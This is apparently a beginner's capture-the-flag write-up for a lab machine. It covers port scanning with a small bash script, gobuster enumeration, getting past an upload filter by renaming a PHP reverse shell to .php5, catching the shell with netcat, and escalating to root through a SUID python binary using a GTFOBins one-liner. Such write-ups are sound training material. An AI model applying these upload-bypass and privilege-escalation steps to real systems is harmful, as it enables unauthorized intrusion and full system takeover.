@@ -1,0 +1,75 @@
+so first i sartred by port scanning by rustscan i just made a script for or just to practice some of new bash sscritpting i have learned
+
+
+<code>#!/bin/bash
+echo "Name the file you want to save the scan result : "
+read name
+echo "Enter the ip address"
+read ip
+echo "[+] Reading ip adress"
+sleep 3
+echo "[+] Started scanning"
+
+
+rustscan -a $ip > $name
+echo "[+] Scan Completed"
+echo "[+]Fetching ip addresses and port"
+cat $name | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]\.[0-9]{1,3} </code>
+
+
+
+and found 2 ports open
+
+Open 10.10.8.25:22
+Open 10.10.8.25:80
+
+started gobuster scan 
+
+gobuster dir -u http://10.10.8.25 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 100
+
+uploads              (Status: 301) [Size: 310] [--> http://10.10.8.25/uploads/]
+/index.php            (Status: 200) [Size: 616]                                 
+/css                  (Status: 301) [Size: 306] [--> http://10.10.8.25/css/]    
+/js                   (Status: 301) [Size: 305] [--> http://10.10.8.25/js/]     
+/panel                (Status: 301) [Size: 308] [--> http://10.10.8.25/panel/] 
+
+found two intresting directories /uploads and /panel
+in panel we have something to upload
+
+i tried uploading file with .php extention but it showed some error!
+after that i tried changing php file with .php.jpg extention and it got uploaded
+
+
+i changed my directory to /uploads there i saw my file after that i starterd my nc listeneer on the port i mentioned in the exploit
+
+after that i waitedd for the rev shell but i didnt got any thing 
+
+from this i have learned if if get error something like
+
+cannot be displayed because it contains error! probably it could be because of exxtention
+"The image “http://10.10.100.244/uploads/php-reverse-shell.php.jpg” cannot be displayed because it contains errors."
+
+and "WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) " this is for not starting the rev connection listener on the terminal
+
+
+
+then i though of changing the file extention to any another i tried with other versions of php that is php5 or php3 i got shell for php5  but in php3 i got error again
+
+i got the shell
+
+
+after that i searched for suid  files as most of the boxes are vuln to that only
+
+find / -type f -perm -u=s 2>/dev/null
+
+i got a python binary with suid bit set just google about the python suid on the fav website gtfobins
+
+
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+
+
+ran this command and got the root user : cheers
+
+
+
